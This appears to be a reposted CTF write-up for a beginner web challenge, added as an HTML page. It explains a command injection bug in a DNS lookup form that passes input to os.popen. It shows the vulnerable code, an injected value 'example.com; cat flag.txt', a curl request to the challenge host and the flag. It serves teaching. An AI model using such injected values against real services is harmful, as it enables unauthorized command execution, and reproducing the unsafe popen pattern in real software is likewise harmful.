@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="The DNS lookup input is passed to a shell command. A semicolon starts a second command that reads the flag.">
+  <title>baby cmd inj | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 1 / EASY</p>
+    <h1>baby cmd inj</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave1/cmd-inj/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>The DNS lookup input is passed to a shell command. A semicolon starts a second command that reads the flag.</p>
+<h2>Root cause</h2>
+<p>The vulnerable command construction is:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-python">cmd = f&quot;dig {domain}&quot;
+output = os.popen(cmd).read()
+</code></pre>
+<p>The submitted domain is concatenated into a shell command. The <code>popen</code> call invokes a shell, so a semicolon, pipe, or command substitution inside the domain is interpreted by the server. Supplying a list of arguments to a non-shell process would avoid this.</p>
+<h2>Vulnerability</h2>
+<p>The normal lookup returns output from the server. Shell separators such as a semicolon change that output and allow another command to run, confirming command injection.</p>
+<h2>Exploit</h2>
+<p>Submit this value as the domain:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">example.com; cat flag.txt
+</code></pre>
+<p>The semicolon ends the intended DNS lookup and starts a command to display <code>flag.txt</code>. The returned result includes the file contents.</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-bash">curl -s -X POST https://baby-cmd-inj.web1.friendly-ctf.securinets.tn/dig \
+  --data-urlencode 'domain=example.com; cat flag.txt'
+</code></pre>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{n3ver_tru5t_us3r_1nput_wh3n_1t_c0m3s_t0_ex3cut1ng_c0mm4nds}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave1">&larr; Back to Wave 1 writeups</a></p>
+  </main>
+</body>
+</html>
